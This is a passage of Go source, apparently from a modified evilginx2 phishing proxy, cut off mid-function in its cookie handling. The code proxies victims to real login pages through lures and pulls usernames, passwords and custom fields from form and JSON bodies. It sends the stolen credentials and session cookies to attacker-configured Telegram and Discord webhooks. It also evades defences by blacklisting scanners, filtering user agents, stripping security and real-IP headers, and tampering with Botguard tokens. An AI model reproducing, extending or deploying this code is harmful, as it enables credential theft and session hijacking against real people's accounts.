/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/DisgoOrg/disgohook"
	"github.com/DisgoOrg/disgohook/api"
	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/inconshreveable/go-vhost"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"golang.org/x/net/proxy"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second

	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	telegram_bot      *tgbotapi.BotAPI
	telegram_chat_id  int64
	discord_bot       api.WebhookClient
}

type ProxySession struct {
	SessionId   string
	Created     bool
	PhishDomain string
	Index       int
}

func (p *HttpProxy) NotifyWebhook(msg string) {
	if p.telegram_bot != nil {
		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
		if _, err := p.telegram_bot.Send(creds); err != nil {
			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
		}
	}

	if p.discord_bot != nil {
		if _, err := p.discord_bot.SendMessage(api.NewWebhookMessageCreateBuilder().
			SetContent(msg).
			Build(),
		); err != nil {
			log.Error("failed to send webhook message with length %v: %s", len(msg), err)
		}
	}
}

func (p *HttpProxy) SendCookies(msg string) {
	if p.telegram_bot != nil {
		cookies := tgbotapi.NewDocumentUpload(p.telegram_chat_id, tgbotapi.FileBytes{
			Name:  "tare-cookies.json",
			Bytes: []byte(msg),
		})
		if _, err := p.telegram_bot.Send(cookies); err != nil {
			log.Error("failed to send telegram cookie webhook with length %v: %s", len(msg), err)
		}
	}

	if p.discord_bot != nil {
		if _, err := p.discord_bot.SendMessage(api.NewWebhookMessageCreateBuilder().
			AddFile("disc_cookies.json", bytes.NewBufferString(msg)).
			Build(),
		); err != nil {
			log.Error("failed to send webhook message with length %v: %s", len(msg), err)
		}
	}
}
func (p *HttpProxy) GetGeo(ip string) string {
	resp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	var result struct {
		City    string `json:"city"`
		Region  string `json:"regionName"`
		Country string `json:"country"`
		ISP     string `json:"isp"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "Unknown"
	}

	return result.City + ", " + result.Region + ", " + result.Country + " (" + result.ISP + ")"
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
		telegram_bot:      nil,
		discord_bot:       nil,
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyEnabled {
		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
		}
	}

	if len(cfg.webhook_telegram) > 0 {
		confSlice := strings.Split(cfg.webhook_telegram, "/")
		if len(confSlice) != 2 {
			log.Fatal("telegram config not in correct format: <bot_token>/<chat_id>")
		}
		bot, err := tgbotapi.NewBotAPI(confSlice[0])
		if err != nil {
			log.Fatal("telegram NewBotAPI: %v", err)
		}
		p.telegram_bot = bot
		p.telegram_chat_id, _ = strconv.ParseInt(confSlice[1], 10, 64)
	}

	if len(cfg.webhook_discord) > 0 {
		webhook, err := disgohook.NewWebhookClientByToken(nil, nil, cfg.webhook_discord)
		if err != nil {
			log.Fatal("failed to create discord webhook: %s", err)
		}
		p.discord_bot = webhook
	}

	p.cookieName = GenRandomString(4)
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:   "",
				Created:     false,
				PhishDomain: "",
				Index:       -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := GetUserIP(nil, req)
			if strings.Contains(from_ip, ":") {
				from_ip = strings.Split(from_ip, ":")[0]
			}
			if p.bl.IsBlacklisted(from_ip) {
				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
				return p.blockRequest(req)
			}
			if p.cfg.GetBlacklistMode() == "all" {
				err := p.bl.AddIP(from_ip)
				if err != nil {
					log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
				} else {
					log.Warning("blacklisted ip address: %s", from_ip)
				}

				return p.blockRequest(req)
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
			}

			parts := strings.SplitN(GetUserIP(nil, req), ":", 2)
			remote_addr := parts[0]

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					sc, err := req.Cookie(p.cookieName)
					if err != nil && !p.isWhitelistedIP(remote_addr) {
						if !p.cfg.IsSiteHidden(pl_name) {
							var vv string
							var uv url.Values
							l, err := p.cfg.GetLureByPath(pl_name, req_path)
							if err == nil {
								log.Debug("triggered lure for path '%s'", req_path)
							} else {
								uv = req.URL.Query()
								vv = uv.Get(p.cfg.verificationParam)
							}
							if l != nil || vv == p.cfg.verificationToken {

								// check if lure user-agent filter is triggered
								if l != nil {
									if len(l.UserAgentFilter) > 0 {
										re, err := regexp.Compile(l.UserAgentFilter)
										if err == nil {
											if !re.MatchString(req.UserAgent()) {
												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

												if p.cfg.GetBlacklistMode() == "unauth" {
													err := p.bl.AddIP(from_ip)
													if err != nil {
														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
													} else {
														log.Warning("blacklisted ip address: %s", from_ip)
													}
												}
												return p.blockRequest(req)
											}
										} else {
											log.Error("lures: user-agent filter regexp is invalid: %v", err)
										}
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
            session.IP = remote_addr 
									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
								//p.NotifyWebhook(fmt.Sprintf("[%d] new visitor has arrived: %s (%s)", sid, req.Header.Get("User-Agent"), remote_addr))
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									landing_url := req_url
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									if l != nil {
										session.RedirectURL = l.RedirectUrl
										session.PhishLure = l
										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
									} else {
										rv := uv.Get(p.cfg.redirectParam)
										if rv != "" {
											u, err := base64.URLEncoding.DecodeString(rv)
											if err == nil {
												session.RedirectURL = string(u)
												log.Debug("redirect URL (get): %s", u)
											}
										}
									}

									// set params from url arguments
									p.extractParams(session, req.URL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									err := p.bl.AddIP(from_ip)
									if err != nil {
										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
									} else {
										log.Warning("blacklisted ip address: %s", from_ip)
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						ok := false
						if err == nil {
							ps.Index, ok = p.sids[sc.Value]
							if ok {
								ps.SessionId = sc.Value
								p.whitelistIP(remote_addr, ps.SessionId)
							}
						} else {
							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
							if ok {
								ps.Index, ok = p.sids[ps.SessionId]
							}
						}
						if ok {
							req_ok = true
						} else {
							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, req_path)
						if err == nil {
							// show html template if it is set for the current lure
							if l.Template != "" {
								if !p.isForwarderUrl(req.URL) {
									path := l.Template
									if !filepath.IsAbs(path) {
										templates_dir := p.cfg.GetTemplatesDir()
										path = filepath.Join(templates_dir, path)
									}
									if _, err := os.Stat(path); !os.IsNotExist(err) {
										t_html, err := os.ReadFile(path)
										if err == nil {

											t_html = p.injectOgHeaders(l, t_html)

											body := string(t_html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html template response")
											}
										} else {
											log.Error("lure: failed to read template file: %s", err)
										}

									} else {
										log.Error("lure: template file does not exist: %s", path)
									}
								}
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Add("Location", rurl)
							return req, resp
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}


				useragent := req.Header.Get("User-Agent")
				if useragent != "" && p.cfg.useragent_override != "" {
					req.Header.Set("User-Agent", p.cfg.useragent_override)
					log.Debug("[%d] Injected User Agent : %s ", ps.Index, p.cfg.useragent_override)
				}

				// ensure that on the headers that shows the true IP cloudflare should not be seen on the Real site request.
				req.Header.Del("Cf-Connecting-IP")
				req.Header.Del("X-Forwarded-For")
				req.Header.Del("X-Real-IP")
				req.Header.Del("True-Client-IP")

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}
				
					// iCloud fix
				auth_attr := req.Header.Get("X-Apple-Auth-Attributes")
				if auth_attr != "" {
					req.Header.Del("X-Apple-Auth-Attributes")
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()

						// force get
						for _, fp := range pl.forceGet {
							if fp.tp == "query" {
								if fp.path.MatchString(req.URL.Path) {
									log.Info("force_get: URL matched: %s", req.URL.Path)

									ok_search := false

									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										log.Info("force_get: Number of search conditions: %d", k_matched)

										for _, fp_s := range fp.search {
											log.Info("force_get: Checking search key pattern: %s", fp_s.key.String())
											for gp := range qs {
												log.Info("force_get: Checking query param: %s", gp)

												if fp_s.key.MatchString(gp) {
													log.Info("force_get: Query param key matched: %s", gp)

													for _, v := range qs[gp] {
														log.Info("force_get: Checking value: %s", v)

														if fp_s.search.MatchString(v) {
															log.Info("force_get: Query param value matched: %s", v)

															if k_matched > 0 {
																k_matched--
																log.Info("force_get: Remaining unmatched: %d", k_matched)
															}
															break
														}
													}
												}
											}
										}

				if k_matched == 0 {
					ok_search = true
					log.Info("force_get: All search conditions matched.")
				} else {
					log.Info("force_get: Not all search conditions matched.")
				}
			} else {
				ok_search = true
				log.Info("force_get: No search conditions defined, skipping match.")
			}

			if ok_search {
				log.Info("force_get: Applying forced query param replacements.")
				for _, fp_f := range fp.force {
					log.Info("force_get: Force rule - key: %s, value: %s", fp_f.key, fp_f.value)

					for gp := range qs {
						if fp_f.key == gp {
							log.Info("force_get: Forcing param: %s", gp)

							for i := range qs[gp] {
								log.Info("force_get: Before: %s = %s", gp, qs[gp][i])
								qs[gp][i] = fp_f.value
								log.Info("force_get: After: %s = %s", gp, qs[gp][i])
							}
						}
					}
				}
			}

			req.URL.RawQuery = qs.Encode()
			log.Info("force_get: Final RawQuery: %s", req.URL.RawQuery)
		}
	}
}
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					body, err := io.ReadAll(req.Body)
					if err == nil {
						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")
						if strings.Contains(contentType, "json") {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
									if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
										p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
									if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
										p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(cm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											p.NotifyWebhook(fmt.Sprintf(`[%d] Custom: %v`, ps.Index, cm[1]))
										}
									}
								}
							}

							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) && fp.tp == "json" {
									log.Info("force_post: url matched: %s", req.URL.Path)
									var decodedPayload map[string]string
									json.Unmarshal(body, &decodedPayload)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											for k, v := range decodedPayload {
												if fp_s.key.MatchString(k) && fp_s.search.MatchString(v) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Info("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}

									if ok_search {
										for _, fp_f := range fp.force {
											decodedPayload[fp_f.key] = fp_f.value
										}
										if encodedBody, err := json.Marshal(decodedPayload); true {
											if err != nil {
												log.Error("force_post: %v", err)
											} else {
												body = encodedBody
												req.ContentLength = int64(len(body))
												log.Info("force_post: body: %s len:%d", body, len(body))
											}
										}
									}
								}
							}

						} else if req.ParseForm() == nil {

							log.Debug("POST: %s", req.URL.Path)
							for k, v := range req.PostForm {
								// patch phishing URLs in POST params with original domains
								for i, vv := range v {
									req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
								}
								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								log.Debug("POST %s = %s", k, v[0])
								if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
									um := pl.username.search.FindStringSubmatch(v[0])
									if len(um) > 1 {
										p.setSessionUsername(ps.SessionId, um[1])
										log.Success("[%d] Username: [%s]", ps.Index, um[1])
										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											p.NotifyWebhook(fmt.Sprintf(`[%d] Username: %v`, ps.Index, um[1]))
										}
									}
								}
								if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
									pm := pl.password.search.FindStringSubmatch(v[0])
									if len(pm) > 1 {
										p.setSessionPassword(ps.SessionId, pm[1])
										log.Success("[%d] Password: [%s]", ps.Index, pm[1])
										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											p.NotifyWebhook(fmt.Sprintf(`[%d] Password: %v`, ps.Index, pm[1]))
										}
									}
								}
								for _, cp := range pl.custom {
									if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
										cm := cp.search.FindStringSubmatch(v[0])
										if len(cm) > 1 {
											p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
											log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
											if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
												log.Error("database: %v", err)
											}
											if len(cm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
												p.NotifyWebhook(fmt.Sprintf(`[%d] Custom: %v`, ps.Index, cm[1]))
											}
										}
									}
								}
							}

							// force posts
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											for k, v := range req.PostForm {
												if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}

									if ok_search {
										for _, fp_f := range fp.force {
											req.PostForm.Set(fp_f.key, fp_f.value)
										}
										body = []byte(req.PostForm.Encode())
										req.ContentLength = int64(len(body))
										log.Debug("force_post: body: %s len:%d", body, len(body))
									}
								}
							}

						}
						for _, fp := range pl.forcePost {
							if fp.path.MatchString(req.URL.Path) && fp.tp == "get" {
								log.Info("get rewrite: url matched: %s", req.URL.Path)
								if len(fp.force) == 1 {
									oldstring := fp.force[0].key
									newstring := fp.force[0].value
									body = bytes.ReplaceAll(body, []byte(oldstring), []byte(newstring))
									req.ContentLength = int64(len(body))
									log.Info("get rewrite: replaced %s with %s, new request len: %d", oldstring, newstring, req.ContentLength)
								}
							}
						}
						if strings.Contains(req.URL.String(), "accountlookup?") {
							log.Info("Botguard detected on: %v", req.RequestURI)

							body = bgRegexp.ReplaceAll(body, GetToken(body))

							req.ContentLength = int64(len(body))
						}
						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.IsDone = true
								s.IsAuthUrl = true
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
						// resp.Header.Del("Access-Control-Allow-Origin")
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}

			// resp.Header.Set("Access-Control-Allow-Origin", "https://www.google.com")
			// resp.Header.Del("Access-Control-Allow-Origin")
			rm_headers := []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
				"X-Apple-Auth-Attributes",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			
			// resp.Request.Host is not modified or accessed anywhere else, only req_hostname is used.
			if host := resp.Header.Get("Host"); host != "" {
				resp.Header.Set("Host", string(p.patchUrls(pl, []byte(host), CONVERT_TO_PHISHING_URLS)))
			}

			// iCloud
			expect_ct := resp.Header.Get("Expect-Ct")
			if expect_ct != "" {
				resp.Header.Set("Expect-Ct", string(p.patchUrls(pl, []byte(expect_ct), CONVERT_TO_PHISHING_URLS)))
			}

			// iCloud iframe fix
			// if resp.Request.URL.Path == "/appleauth/auth/authorize/signin" {
			// 	// resp.Header.Add("X-Frame-Options", "ALLOW-FROM 	"+string(p.patchUrls(pl, []byte("https://appleid.apple.com"), CONVERT_TO_PHISHING_URLS)))
			// 	log.Error("x-frame-options: %v", resp.Header.Get("X-Frame-Options"))
			// }
			
			
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
							if err != nil {
								log.Error("time.Parse: %v", err)
							}
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else if c_domain[0] != '.' {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						c_domain = "." + c_domain
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
